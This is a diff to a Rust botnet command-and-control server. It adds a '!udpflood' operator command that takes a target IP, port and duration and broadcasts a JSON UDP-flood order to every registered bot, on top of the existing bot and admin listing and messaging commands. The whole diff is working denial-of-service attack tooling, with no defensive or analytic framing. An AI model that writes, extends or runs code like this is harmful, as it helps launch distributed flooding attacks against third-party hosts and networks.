@@ -6,6 +6,9 @@ use std::fs::File;
 use std::io::{ BufRead, BufReader, Read, Write};
 use lazy_static::lazy_static;
 use std::sync::{Arc, Mutex};
+use serde_json::json;
+
+//extern crate serde_json;
 
 use crate::common::{BOT_COUNT, BOT_REGISTRY, ADMIN_REGISTRY};
 use crate::common::ADMIN_COUNT;
@@ -33,6 +36,7 @@ lazy_static! {
         m.insert("!showbots".to_string(), Box::new(ShowBotsCommand) as Box<dyn CommandHandler + Send>);
         m.insert("!showadmins".to_string(), Box::new(ShowAdminsCommand) as Box<dyn CommandHandler + Send>);
         m.insert("!sendmsg".to_string(), Box::new(SendMsgCommand) as Box<dyn CommandHandler + Send>);
+        m.insert("!udpflood".to_string(), Box::new(UdpFloodCommand) as Box<dyn CommandHandler + Send>);
 
         Arc::new(Mutex::new(m))
     };
@@ -89,7 +93,6 @@ impl CommandHandler for ShowAdminsCommand {
     }
 }
 struct SendMsgCommand;
-
 impl CommandHandler for SendMsgCommand {
     fn handle(&self, _stream: &mut TcpStream, args: &[String]) {
         if args.is_empty() {
@@ -102,6 +105,46 @@ impl CommandHandler for SendMsgCommand {
     }
 }
 
+
+
+struct UdpFloodCommand;
+impl CommandHandler for UdpFloodCommand {
+    fn handle(&self, stream: &mut TcpStream, args: &[String]) {
+        // Check if the correct number of arguments are provided
+        if args.len() != 3 {
+            let msg = "Usage: !udpflood <IP> <Port> <Seconds>\n";
+            stream.write_all(msg.as_bytes()).expect("Failed to write to stream");
+            return;
+        }
+
+        // Validate IP address 
+        // TODO: more sophisticated validation required
+        let ip_addr = &args[0];
+
+        // Validate port
+        let port = match args[1].parse::<i32>() {
+            Ok(p) => p,
+            Err(_) => {
+                let msg = "Invalid port: must be an integer.\n";
+                stream.write_all(msg.as_bytes()).expect("Failed to write to stream");
+                return;
+            }
+        };
+
+        // Validate seconds
+        let seconds = match args[2].parse::<i32>() {
+            Ok(s) => s,
+            Err(_) => {
+                let msg = "Invalid duration: must be an integer (seconds).\n";
+                stream.write_all(msg.as_bytes()).expect("Failed to write to stream");
+                return;
+            }
+        };
+
+        send_udp_flood(ip_addr, port, seconds);
+    }
+}
+
 pub fn broadcast_to_bots(message: &str) {
     let registry = BOT_REGISTRY.lock().unwrap();
     for (_, stream) in registry.iter() {
@@ -110,6 +153,17 @@ pub fn broadcast_to_bots(message: &str) {
             eprintln!("Failed to send message to a bot {}: {}", stream.peer_addr().unwrap().to_string(), e);
         }
     }
+}
+
+pub fn send_udp_flood(ip_addr: &str, port: i32, seconds: i32) {
+    let message = json!({
+        "type": "UDP",
+        "ip": ip_addr,
+        "port": port,
+        "seconds": seconds
+    }).to_string();
+
+    broadcast_to_bots(&message);
 }
 
 
